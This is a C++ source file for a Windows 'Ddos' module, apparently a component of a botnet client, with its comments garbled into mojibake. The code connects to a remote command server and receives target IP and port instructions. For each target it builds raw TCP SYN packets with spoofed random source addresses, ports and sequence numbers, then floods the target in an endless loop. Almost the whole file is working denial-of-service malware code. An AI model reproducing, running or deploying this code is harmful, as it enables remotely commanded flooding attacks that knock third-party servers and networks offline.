#include "pch.h"
#include "Ddos.h"

#define SEQ 0x28376839

static CRITICAL_SECTION gds;

static Ddos ds;

//����һ��tcphdr�ṹ�����TCP�ײ�
typedef struct tcphdr
{
	USHORT th_sport;//16λԴ�˿ں�
	USHORT th_dport;//16λĿ�Ķ˿ں�
	unsigned int th_seq;//32λ���к�
	unsigned int th_ack;//32λȷ�Ϻ�
	unsigned char th_lenres;//4λ�ײ�����+6λ�������е�4λ
	unsigned char th_flag;//6λ�������е�2λ+6λ��־λ
	USHORT th_win;//16λ���ڴ�С
	USHORT th_sum;//16λЧ���
	USHORT th_urp;//16λ��������ƫ����
}TCP_HEADER;


//����һ��iphdr�����IP�ײ�
typedef struct iphdr//ip�ײ�
{
	unsigned char h_verlen;//4λIP�汾��+��4λ�ײ�����
	unsigned char tos;//8λ��������
	unsigned short total_len;//16λ�ܳ���
	unsigned short ident;//16λ��־
	unsigned short frag_and_flags;//3λ��־λ����SYN,ACK,�ȵ�)+Ƭƫ����
	unsigned char ttl;//8λ����ʱ��
	unsigned char proto;//8λЭ��
	unsigned short checksum;//ip�ײ�Ч���
	unsigned int sourceIP;//α��IP��ַ
	unsigned int destIP;//������ip��ַ
}IP_HEADER;


//TCPα�ײ������ڽ���TCPЧ��͵ļ��㣬��֤TCPЧ�����Ч��
struct
{
	unsigned long saddr;//Դ��ַ
	unsigned long daddr;//Ŀ�ĵ�ַ
	char mbz;//�ÿ�
	char ptcl;//Э������
	unsigned short tcpl;//TCP����
}PSD_HEADER;


Ddos::Ddos()
{
	DdosSplit = ";";
	DdosEnd = "\r\n";

	InitializeCriticalSection(&gds);
	// ��ʼ�����������
	srand((unsigned)time(NULL));
}

Ddos::~Ddos()
{
	DeleteCriticalSection(&gds);
}

// ����У���
//������IP��ʱ����Ҫ����IP��ͷ��У��ͣ�
//
//1��  ��У����ֶ���Ϊ0��
//
//2��  ��IPͷ���е�ÿ16bit���ж�������ͣ�
//
//3��  ����͵ĸ�16bit��Ϊ0���򽫺͵ĸ�16bit�͵�16bit������ӣ�ֱ���͵ĸ�16bitΪ0���Ӷ����һ��16bit��ֵ��
//
//4��  ����16bit��ֵȡ��������У����ֶΡ�
USHORT Ddos::checksum(USHORT* buffer, int size)
{
	unsigned long cksum = 0;
	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size) cksum += *(UCHAR*)buffer;
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (USHORT)(~cksum);
}

void Ddos::startByNewThread(std::string domain, int port)
{
	char* args = new char[MAX_PATH + sizeof(int)];
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);
	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	HANDLE h = CreateThread(NULL, 0, Ddos::threadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD Ddos::threadProc(LPVOID args)
{
	char domain[MAX_PATH];
	memcpy(domain, args, MAX_PATH);
	
	int port = *((int*)((char*)args + MAX_PATH));

	startDdosSpy(std::string(domain), port);

	delete (char*)args;
	return true;
}

void Ddos::startDdosSpy(std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {

		char tmpPort[8];
		_itoa_s(port, tmpPort, sizeof(tmpPort), 10);
		OutputDebugStringA("Failed to connect cmd spy server ");
		OutputDebugStringA(domain.data());
		OutputDebugStringA(":");
		OutputDebugStringA(tmpPort);
		OutputDebugStringA("\r\n");
		
		return;
	}

	OutputDebugStringA("Started ddos atk\r\n");

	const int packetSize = 800;
	char szData[packetSize];
	int ret;
	std::string buf;

	while (1) {
		ret = sock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}

		addDataToBuffer(&sock, buf, szData, ret);
	}

	OutputDebugStringA("Finished ddos atk\r\n");
}

void Ddos::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
	buf.append(data, size);

	int endIndex;
	while ((endIndex = buf.find(ds.DdosEnd)) >= 0) {
		std::string line = buf.substr(0, endIndex);
		buf.erase(0, endIndex + ds.DdosEnd.length());

		std::map<std::string, std::string> ddosargs = ds.parseArgs(line);

		execDdos(ddosargs["IP"].data(), atoi(ddosargs["PORT"].data()));
	}
}

std::map<std::string, std::string> Ddos::parseArgs(std::string& data)
{
	// �ַ����ָ���б�
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(DdosSplit);
	pos1 = 0;
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + DdosSplit.size();
		pos2 = data.find(DdosSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));

	// ��������
	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

// ���Ĺ�������
void Ddos::execDdos(std::string atk_ip, int atk_port)
{
	EnterCriticalSection(&gds);

	int port = atk_port;
	const char* DestIP = atk_ip.data();

	// ����ʹ��ԭʼ�׽��� �Լ�����tcp��
	/******************/
	SOCKET  sock = (SOCKET)NULL;
	int flag = true, TimeOut = 2000, FakeIpNet, FakeIpHost, dataSize = 0;
	struct sockaddr_in sockAddr;
	TCP_HEADER  tcpheader;
	IP_HEADER   ipheader;
	char        sendBuf[128] = { 0 };
	sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
	//����IP_HDRINCL�Ա��Լ����IP�ײ�
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(int));
	//���÷��ͳ�ʱ
	setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&TimeOut, sizeof(TimeOut));
	//����Ŀ���ַ
	memset(&sockAddr, 0, sizeof(sockAddr));  //��0
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = inet_addr(DestIP);
	FakeIpNet = inet_addr(DestIP);
	FakeIpHost = ntohl(FakeIpNet);
	//���IP�ײ�
	ipheader.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
	ipheader.total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
	ipheader.ident = 1;
	ipheader.frag_and_flags = 0;
	ipheader.ttl = 128;
	ipheader.proto = IPPROTO_TCP;
	ipheader.checksum = 0;
	ipheader.sourceIP = htonl(FakeIpHost + rand()%65535); // ��ͼ�����ip
	ipheader.destIP = inet_addr(DestIP);
	//���TCP�ײ�
	tcpheader.th_dport = htons(port);  //Ŀ�Ķ˿�
	tcpheader.th_sport = htons(rand() % 1025);   // ��ͼ�����Դ�˿�
	tcpheader.th_seq = htonl(SEQ + rand()%65535); // ��������к�Ҳ�����
	tcpheader.th_ack = 0;
	tcpheader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
	tcpheader.th_flag = 2;
	tcpheader.th_win = htons(16384);
	tcpheader.th_urp = 0;
	tcpheader.th_sum = 0;
	PSD_HEADER.saddr = ipheader.sourceIP;
	PSD_HEADER.daddr = ipheader.destIP;
	PSD_HEADER.mbz = 0;
	PSD_HEADER.ptcl = IPPROTO_TCP;
	PSD_HEADER.tcpl = htons(sizeof(tcpheader));
	// ��������
	for (;;)
	{
		// ÿ��ѭ�������������к� Դip Դ�˿�
		ipheader.checksum = 0;
		ipheader.sourceIP = htonl(FakeIpHost + rand()%65535);
		tcpheader.th_seq = htonl(SEQ + rand()%65535);
		tcpheader.th_sport = htons(rand() % 1025);
		tcpheader.th_sum = 0;
		PSD_HEADER.saddr = ipheader.sourceIP;
		//��TCPα�ײ���TCP�ײ����Ƶ�ͬһ������������TCPЧ���
		memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
		memcpy(sendBuf + sizeof(PSD_HEADER), &tcpheader, sizeof(tcpheader));
		tcpheader.th_sum = checksum((USHORT*)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpheader));
		memcpy(sendBuf, &ipheader, sizeof(ipheader));
		memcpy(sendBuf + sizeof(ipheader), &tcpheader, sizeof(tcpheader));
		memset(sendBuf + sizeof(ipheader) + sizeof(tcpheader), 0, 4);
		dataSize = sizeof(ipheader) + sizeof(tcpheader);
		ipheader.checksum = checksum((USHORT*)sendBuf, dataSize);
		memcpy(sendBuf, &ipheader, sizeof(ipheader));
		sendto(sock, sendBuf, dataSize, 0, (struct sockaddr*) & sockAddr, sizeof(sockAddr));
	}
	/******************/
	WSACleanup();
	// �����������
	LeaveCriticalSection(&gds);

}
